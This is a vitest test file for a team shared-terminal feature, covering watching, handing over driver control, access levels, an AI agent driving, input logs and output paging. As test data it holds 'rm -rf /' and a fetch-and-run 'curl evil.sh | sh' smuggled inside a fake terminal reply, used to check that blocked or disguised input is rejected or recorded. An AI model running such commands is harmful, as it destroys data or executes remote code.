import { expect, test, vi } from "vitest";
import { api } from "../convex/_generated/api";
import type { Id } from "../convex/_generated/dataModel";
import { OUTPUT_CHUNK_BYTES, OUTPUT_PAGE_BYTES } from "../convex/lib/terminals";
import { addAgent, addTeammate, bridgeInbox, bridgeSays, callAsAgent, linkMachine, newRoom, newTeam } from "./setup";

/** Julio starts a terminal on a team box at the given access; Ana is a teammate. */
async function sharedTerminal(access: "watch" | "suggest" | "drive" | "open") {
  const t = newRoom();
  const { teamId, admin: julio } = await newTeam(t);
  const ana = await addTeammate(t, teamId, julio, "Ana");
  const { machineId, token } = await linkMachine(t, teamId, julio, "team-box", { team: true });
  await julio.as.mutation(api.machines.updateSettings, { teamId, machineId, mostOpenAccess: "open" });
  const taskId = await julio.as.mutation(api.tasks.create, { teamId, title: "Deploy 0.4.2" });
  const { terminalId } = await julio.as.mutation(api.runs.start, { teamId, taskId, harness: "shell", machineId, access });
  await bridgeSays(t, token, { type: "terminal_started", terminalId, localRef: "pty-1", title: "Deploy", tool: "shell", access });
  return { t, teamId, julio, ana, machineId, token, terminalId: terminalId as Id<"terminals"> };
}

const inputs = async (t: any, token: string) =>
  (await bridgeInbox(t, token)).filter((m: any) => m.type === "input");

test("teammates watch a terminal's screen live and see who else is watching and who drives", async () => {
  const { t, teamId, ana, token, terminalId } = await sharedTerminal("watch");
  await bridgeSays(t, token, { type: "terminal_output", terminalId, seq: 1, data: "$ pnpm deploy\r\n" });
  await bridgeSays(t, token, { type: "terminal_output", terminalId, seq: 2, data: "Deploying…\r\n" });

  await ana.as.mutation(api.terminals.watch, { teamId, terminalId });

  const output = await ana.as.query(api.terminals.output, { teamId, terminalId, afterSeq: 0 });
  expect(output.chunks.map((c) => c.data).join("")).toBe("$ pnpm deploy\r\nDeploying…\r\n");
  const terminal = await ana.as.query(api.terminals.get, { teamId, terminalId });
  expect(terminal).toMatchObject({ driver: { name: "Julio" }, watching: [{ name: "Ana" }] });
});

test("only the driver's input reaches the terminal, and each input is recorded with who sent it", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("open");

  await expect(ana.as.mutation(api.terminals.input, { teamId, terminalId, data: "rm -rf /\r" })).rejects.toThrow(/driver/i);
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "ls\r" });

  expect(await inputs(t, token)).toMatchObject([{ terminalId, data: "ls\r", from: { name: "Julio" } }]);
  const log = await julio.as.query(api.terminals.inputLog, { teamId, terminalId, paginationOpts: { numItems: 20, cursor: null } });
  expect(log.page).toMatchObject([{ data: "ls\r", by: { name: "Julio" } }]);
});

const log = async (who: any, teamId: Id<"teams">, terminalId: Id<"terminals">) =>
  (await who.as.query(api.terminals.inputLog, { teamId, terminalId, paginationOpts: { numItems: 50, cursor: null } })).page
    .map((r: any) => ({ data: r.data, kind: r.kind, by: r.by.name }))
    .reverse();

test("the driver's screen's own replies reach the terminal and are recorded, marked as replies", async () => {
  const { t, teamId, julio, token, terminalId } = await sharedTerminal("watch");
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-laptop" });
  await bridgeSays(t, token, { type: "terminal_output", terminalId, seq: 1, data: "\x1b[?1004h\x1b[c\x1b[6n" });
  // xterm.js's own replies: focus in (turning on focus reporting asks for it), device attributes, cursor position.
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "\x1b[I\x1b[?1;2c\x1b[12;40R", reply: true, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "\x1b[O", reply: true, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "\r" });

  expect(await inputs(t, token)).toMatchObject([
    { data: "\x1b[I\x1b[?1;2c\x1b[12;40R", reply: true },
    { data: "\x1b[O", reply: true },
    { data: "\r" },
  ]);
  expect(await log(julio, teamId, terminalId)).toEqual([
    { data: "\x1b[I\x1b[?1;2c\x1b[12;40R", kind: "reply", by: "Julio" },
    { data: "\x1b[O", kind: "reply", by: "Julio" },
    { data: "\r", kind: "typed", by: "Julio" },
  ]);
});

test("everything that reaches the terminal is recorded: a reply mark can't hide typing", async () => {
  const { t, teamId, julio, token, terminalId } = await sharedTerminal("watch");
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-laptop" });
  // Codex's review: in bash this runs `echo review-123`, and the log must show the 123.
  const sent = ["echo review-", "\x1b[?123c", "\x7f\r"];
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: sent[0]! });
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: sent[1]!, reply: true, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: sent[2]! });
  // A device attributes reply 700,000 digits long, and text after a real reply.
  const long = `\x1b[?${"1".repeat(700_000)}c`;
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: long, reply: true, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "\x1b[I; curl evil.sh | sh\r", reply: true, screenId: "julio-laptop" });

  const forwarded = (await inputs(t, token)).map((m: any) => m.data);
  expect(forwarded).toEqual([...sent, long, "\x1b[I; curl evil.sh | sh\r"]);
  const recorded = await log(julio, teamId, terminalId);
  expect(recorded.map((r: any) => r.data)).toEqual(forwarded);
  // None of them is a reply xterm.js makes, so each is recorded and shown as typing.
  expect(recorded.every((r: any) => r.kind === "typed")).toBe(true);
});

/** Who sent which reply that reached the bridge, in order. */
const answers = (t: any, token: string) =>
  inputs(t, token).then((all) => all.map((m: any) => `${m.from.name}:${JSON.stringify(m.data)}`));
const reply = (who: any, teamId: Id<"teams">, terminalId: Id<"terminals">, screenId: string, data = "\x1b[?1;2c") =>
  who.as.mutation(api.terminals.input, { teamId, terminalId, data, reply: true, screenId });

test("one screen answers: the driver's that claimed last; the other screens' replies are dropped, unsent and unrecorded", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("open");
  await expect(ana.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "ana-desk" })).rejects.toThrow(/driver/i);
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-desk" });
  await reply(julio, teamId, terminalId, "julio-laptop");
  await reply(julio, teamId, terminalId, "julio-desk");
  await reply(ana, teamId, terminalId, "ana-desk");
  // Both of the driver's screens type.
  await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "ls\r" });

  expect(await answers(t, token)).toEqual(['Julio:"\\u001b[?1;2c"', 'Julio:"ls\\r"']);
  expect((await log(julio, teamId, terminalId)).map((r: any) => r.kind)).toEqual(["reply", "typed"]);
  expect((await julio.as.query(api.terminals.get, { teamId, terminalId })).responderScreenId).toBe("julio-desk");
});

test("when the wheel moves, the old driver's screen stops answering and the new driver's answers once it claims", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("open");
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-laptop" });
  await julio.as.mutation(api.terminals.passWheel, { teamId, terminalId, to: ana.memberId });
  expect((await julio.as.query(api.terminals.get, { teamId, terminalId })).responderScreenId).toBeUndefined();
  // A reply still on its way from Julio's screen is lost: the program asks again at its next prompt.
  await reply(julio, teamId, terminalId, "julio-laptop");
  await reply(ana, teamId, terminalId, "ana-desk");
  await ana.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "ana-desk" });
  await reply(ana, teamId, terminalId, "ana-desk", "\x1b[3;1R");
  await reply(julio, teamId, terminalId, "julio-laptop");

  expect(await answers(t, token)).toEqual(['Ana:"\\u001b[3;1R"']);
});

test("when the screen that answers closes, the next of the driver's screens to open or get focus answers", async () => {
  const { t, teamId, julio, token, terminalId } = await sharedTerminal("watch");
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-laptop" });
  // The laptop's window closes; it says nothing. The desk's replies go nowhere until it claims.
  await reply(julio, teamId, terminalId, "julio-desk");
  await julio.as.mutation(api.terminals.claimReplies, { teamId, terminalId, screenId: "julio-desk" });
  await reply(julio, teamId, terminalId, "julio-desk", "\x1b[I");

  expect(await answers(t, token)).toEqual(['Julio:"\\u001b[I"']);
});

test("the input log pages newest first, so the full record stays reachable without reading it all at once", async () => {
  const { teamId, julio, terminalId } = await sharedTerminal("drive");
  for (let i = 0; i < 12; i++) await julio.as.mutation(api.terminals.input, { teamId, terminalId, data: `cmd-${i}\r` });

  const first = await julio.as.query(api.terminals.inputLog, { teamId, terminalId, paginationOpts: { numItems: 5, cursor: null } });
  expect(first.page.map((r) => r.data)).toEqual(["cmd-11\r", "cmd-10\r", "cmd-9\r", "cmd-8\r", "cmd-7\r"]);
  expect(first.page[0]).toMatchObject({ by: { name: "Julio" } });
  expect(first.isDone).toBe(false);

  const second = await julio.as.query(api.terminals.inputLog, {
    teamId,
    terminalId,
    paginationOpts: { numItems: 5, cursor: first.continueCursor },
  });
  const third = await julio.as.query(api.terminals.inputLog, {
    teamId,
    terminalId,
    paginationOpts: { numItems: 5, cursor: second.continueCursor },
  });
  expect([...first.page, ...second.page, ...third.page].map((r) => r.data)).toEqual(
    Array.from({ length: 12 }, (_, i) => `cmd-${11 - i}\r`),
  );
  expect(third.isDone).toBe(true);
});

test("on a Watch terminal teammates can't suggest or take the wheel", async () => {
  const { teamId, ana, terminalId } = await sharedTerminal("watch");
  await expect(ana.as.mutation(api.terminals.suggest, { teamId, terminalId, command: "ls" })).rejects.toThrow(/watch/i);
  await expect(ana.as.mutation(api.terminals.requestWheel, { teamId, terminalId })).rejects.toThrow(/watch/i);
});

test("on a Suggest terminal a teammate proposes a command and it runs only when the driver sends it", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("suggest");

  const suggestionId = await ana.as.mutation(api.terminals.suggest, { teamId, terminalId, command: "pnpm test" });
  expect(await inputs(t, token)).toEqual([]);
  await expect(ana.as.mutation(api.terminals.sendSuggestion, { teamId, suggestionId })).rejects.toThrow(/driver/i);

  await julio.as.mutation(api.terminals.sendSuggestion, { teamId, suggestionId, command: "pnpm test --run" });

  expect(await inputs(t, token)).toMatchObject([{ data: "pnpm test --run\r", from: { name: "Julio" } }]);
  const log = await julio.as.query(api.terminals.inputLog, { teamId, terminalId, paginationOpts: { numItems: 20, cursor: null } });
  expect(log.page).toMatchObject([{ data: "pnpm test --run\r", by: { name: "Julio" }, suggestedBy: { name: "Ana" } }]);
});

test("on a Drive terminal a teammate asks for the wheel and gets it when the driver agrees", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("drive");
  await expect(ana.as.mutation(api.terminals.takeWheel, { teamId, terminalId })).rejects.toThrow(/ask/i);

  const requestId = await ana.as.mutation(api.terminals.requestWheel, { teamId, terminalId });
  await julio.as.mutation(api.terminals.answerWheelRequest, { teamId, requestId, grant: true });

  expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ driver: { name: "Ana" } });
  expect(await bridgeInbox(t, token)).toContainEqual(
    expect.objectContaining({ type: "driver_changed", terminalId, driver: expect.objectContaining({ name: "Ana" }) }),
  );
});

test("on an Open terminal anyone takes the wheel at once, one keyboard at a time", async () => {
  const { teamId, julio, ana, terminalId } = await sharedTerminal("open");

  await ana.as.mutation(api.terminals.takeWheel, { teamId, terminalId });

  expect(await ana.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ driver: { name: "Ana" } });
  await expect(julio.as.mutation(api.terminals.input, { teamId, terminalId, data: "ls\r" })).rejects.toThrow(/driver/i);
});

test("an agent can drive a terminal, and the board shows the agent steering", async () => {
  const { t, teamId, julio, terminalId } = await sharedTerminal("drive");
  const { key } = await addAgent(t, teamId, julio, "Hermes", ["room.read", "terminals.drive"]);
  const members = await julio.as.query(api.teams.members, { teamId });
  const hermes = members.find((m) => m.name === "Hermes")!;

  await julio.as.mutation(api.terminals.passWheel, { teamId, terminalId, to: hermes.memberId });
  const typed = await callAsAgent(t, key, "terminals.input", { terminalId, data: "make deploy\r" });

  expect(typed.ok).toBe(true);
  const terminal = await julio.as.query(api.terminals.get, { teamId, terminalId });
  expect(terminal.driver).toMatchObject({ name: "Hermes", kind: "agent", addedBy: { name: "Julio" } });
});

test("every change to access and the driver is recorded with who made it", async () => {
  const { teamId, julio, ana, terminalId } = await sharedTerminal("open");
  await julio.as.mutation(api.terminals.setAccess, { teamId, terminalId, access: "drive" });
  await julio.as.mutation(api.terminals.passWheel, { teamId, terminalId, to: ana.memberId });

  const log = await julio.as.query(api.activity.list, { teamId });
  expect(log.map((e) => [e.action, e.actor.name])).toEqual(
    expect.arrayContaining([
      ["terminal.access_changed", "Julio"],
      ["terminal.driver_changed", "Julio"],
    ]),
  );
});

test("a terminal shared from the machine itself appears in the room, driven by whoever linked the machine", async () => {
  const t = newRoom();
  const { teamId, admin } = await newTeam(t);
  const { token } = await linkMachine(t, teamId, admin, "julio-mbp");

  await bridgeSays(t, token, { type: "terminal_started", localRef: "local-1", title: "zsh", tool: "shell", access: "suggest" });

  const [terminal] = await admin.as.query(api.terminals.list, { teamId });
  expect(terminal).toMatchObject({ title: "zsh", access: "suggest", driver: { name: "Julio" }, usesSlot: false });
  const sent = await bridgeInbox(t, token);
  expect(sent).toContainEqual({ v: 1, type: "terminal_linked", localRef: "local-1", terminalId: terminal!.terminalId });
  expect(sent).toContainEqual(
    expect.objectContaining({ type: "driver_changed", terminalId: terminal!.terminalId, driver: expect.objectContaining({ name: "Julio" }) }),
  );
});

test("lowering a terminal below Drive cancels its wheel requests, and below Suggest its suggestions", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("drive");
  const requestId = await ana.as.mutation(api.terminals.requestWheel, { teamId, terminalId });
  await ana.as.mutation(api.terminals.suggest, { teamId, terminalId, command: "ls" });

  await julio.as.mutation(api.terminals.setAccess, { teamId, terminalId, access: "suggest" });

  expect(await julio.as.query(api.terminals.wheelRequests, { teamId, terminalId })).toEqual([]);
  await expect(julio.as.mutation(api.terminals.answerWheelRequest, { teamId, requestId, grant: true })).rejects.toThrow();
  expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ driver: { name: "Julio" } });
  expect(await julio.as.query(api.terminals.suggestions, { teamId, terminalId })).toHaveLength(1);

  // The bridge lowers it further, for example because the machine's own limit dropped.
  await bridgeSays(t, token, { type: "terminal_access", terminalId, access: "watch" });

  expect(await julio.as.query(api.terminals.suggestions, { teamId, terminalId })).toEqual([]);
});

test("a late terminal_started never raises access the room lowered since", async () => {
  const t = newRoom();
  const { teamId, admin: julio } = await newTeam(t);
  const { machineId, token } = await linkMachine(t, teamId, julio, "team-box", { team: true });
  await julio.as.mutation(api.machines.updateSettings, { teamId, machineId, mostOpenAccess: "open" });
  const taskId = await julio.as.mutation(api.tasks.create, { teamId, title: "Deploy 0.4.2" });
  const { terminalId } = await julio.as.mutation(api.runs.start, { teamId, taskId, harness: "shell", machineId, access: "open" });
  await julio.as.mutation(api.terminals.setAccess, { teamId, terminalId: terminalId!, access: "watch" });

  await bridgeSays(t, token, { type: "terminal_started", terminalId, localRef: "pty-1", title: "Deploy", tool: "shell", access: "open" });

  expect(await julio.as.query(api.terminals.get, { teamId, terminalId: terminalId! })).toMatchObject({ status: "live", access: "watch" });
});

test("a raise made while a terminal starts survives the start report, and the bridge's own clamp still lowers it", async () => {
  const t = newRoom();
  const { teamId, admin: julio } = await newTeam(t);
  const { machineId, token } = await linkMachine(t, teamId, julio, "team-box", { team: true });
  await julio.as.mutation(api.machines.updateSettings, { teamId, machineId, mostOpenAccess: "open" });
  const taskId = await julio.as.mutation(api.tasks.create, { teamId, title: "Deploy 0.4.2" });
  const { terminalId } = await julio.as.mutation(api.runs.start, { teamId, taskId, harness: "shell", machineId, access: "watch" });
  await julio.as.mutation(api.terminals.setAccess, { teamId, terminalId: terminalId!, access: "open" });

  // The bridge started it at Watch, then applied the room's change to Open.
  await bridgeSays(t, token, { type: "terminal_started", terminalId, localRef: "pty-1", title: "Deploy", tool: "shell", access: "watch" });

  expect(await julio.as.query(api.terminals.get, { teamId, terminalId: terminalId! })).toMatchObject({ status: "live", access: "open" });

  await bridgeSays(t, token, { type: "terminal_access", terminalId, access: "drive" });
  expect(await julio.as.query(api.terminals.get, { teamId, terminalId: terminalId! })).toMatchObject({ access: "drive" });
});

const resizes = async (t: any, token: string) =>
  (await bridgeInbox(t, token)).filter((m: any) => m.type === "resize_terminal");

test("only the driver resizes a terminal, and the size is clamped to what a screen can sensibly be", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("open");

  await expect(ana.as.mutation(api.terminals.resize, { teamId, terminalId, cols: 100, rows: 40 })).rejects.toThrow(/driver/i);
  expect(await resizes(t, token)).toEqual([]);

  await julio.as.mutation(api.terminals.resize, { teamId, terminalId, cols: 100, rows: 40 });
  await julio.as.mutation(api.terminals.resize, { teamId, terminalId, cols: 3, rows: 1 });
  await julio.as.mutation(api.terminals.resize, { teamId, terminalId, cols: 9000, rows: 900.6 });

  expect(await resizes(t, token)).toMatchObject([
    { terminalId, cols: 100, rows: 40, from: { name: "Julio" } },
    { cols: 20, rows: 5 },
    { cols: 500, rows: 200 },
  ]);
});

test("below Drive only whoever started a terminal takes the wheel, not their agent, as the bridge allows", async () => {
  const { t, teamId, julio, ana, token, terminalId } = await sharedTerminal("open");
  const { key } = await addAgent(t, teamId, julio, "Hermes", ["room.read", "terminals.drive"]);
  await ana.as.mutation(api.terminals.takeWheel, { teamId, terminalId });
  await julio.as.mutation(api.terminals.setAccess, { teamId, terminalId, access: "suggest" });

  const taken = await callAsAgent(t, key, "terminals.takeWheel", { terminalId });

  expect(taken).toMatchObject({ ok: false, error: { code: "forbidden" } });
  expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ driver: { name: "Ana" } });
  expect(await bridgeInbox(t, token)).not.toContainEqual(
    expect.objectContaining({ type: "driver_changed", driver: expect.objectContaining({ name: "Hermes" }) }),
  );
  await julio.as.mutation(api.terminals.takeWheel, { teamId, terminalId });
  expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ driver: { name: "Julio" } });
});

test("a watcher who leaves drops off the watching list when their window passes, with no other write", async () => {
  vi.useFakeTimers({ now: new Date("2026-11-02T12:00:00Z") });
  try {
    const { t, teamId, julio, ana, terminalId } = await sharedTerminal("watch");
    for (let i = 0; i < 3; i++) {
      await ana.as.mutation(api.terminals.watch, { teamId, terminalId });
      vi.advanceTimersByTime(15_000);
      await t.finishInProgressScheduledFunctions();
    }
    expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ watching: [{ name: "Ana" }] });

    // Ana closes the terminal. Nothing else writes, so the room must, or a subscribed view keeps her watching.
    await t.finishAllScheduledFunctions(vi.runAllTimers);

    expect(await t.run((ctx) => ctx.db.query("watchers").collect())).toEqual([]);
    expect(await julio.as.query(api.terminals.get, { teamId, terminalId })).toMatchObject({ watching: [] });
  } finally {
    vi.useRealTimers();
  }
});

test("a noisy terminal's output is kept in small chunks and replays in pages, in order", async () => {
  const { t, teamId, ana, token, terminalId } = await sharedTerminal("watch");
  const bytes = (s: string) => new TextEncoder().encode(s).length;
  // Multi-byte characters, including an emoji (a surrogate pair), so a split in the middle of one would show.
  const flush = (n: number) => `build ${n}: naïve café 🚀 ok\r\n`.repeat(50_000);
  const sent = [1, 2, 3, 4].map(flush);
  for (const [i, data] of sent.entries()) await bridgeSays(t, token, { type: "terminal_output", terminalId, seq: i + 1, data });
  // The bridge sends a message again after a retry; the room keeps it once.
  await bridgeSays(t, token, { type: "terminal_output", terminalId, seq: 2, data: sent[1] });

  let afterSeq = 0;
  let pages = 0;
  let replay = "";
  const seqs: number[] = [];
  for (;;) {
    const page = await ana.as.query(api.terminals.output, { teamId, terminalId, afterSeq });
    pages++;
    expect(page.chunks.reduce((sum, c) => sum + bytes(c.data), 0)).toBeLessThanOrEqual(OUTPUT_PAGE_BYTES);
    for (const chunk of page.chunks) {
      expect(bytes(chunk.data)).toBeLessThanOrEqual(OUTPUT_CHUNK_BYTES);
      replay += chunk.data;
      seqs.push(chunk.seq);
    }
    // The desktop app pages on from the last chunk it wrote.
    if (!page.more) break;
    expect(page.cursor).toBe(page.chunks.at(-1)!.seq);
    afterSeq = page.cursor;
  }

  expect(pages).toBeGreaterThan(1);
  expect(replay).toBe(sent.join(""));
  expect(seqs).toEqual(seqs.map((_, i) => i + 1));
});
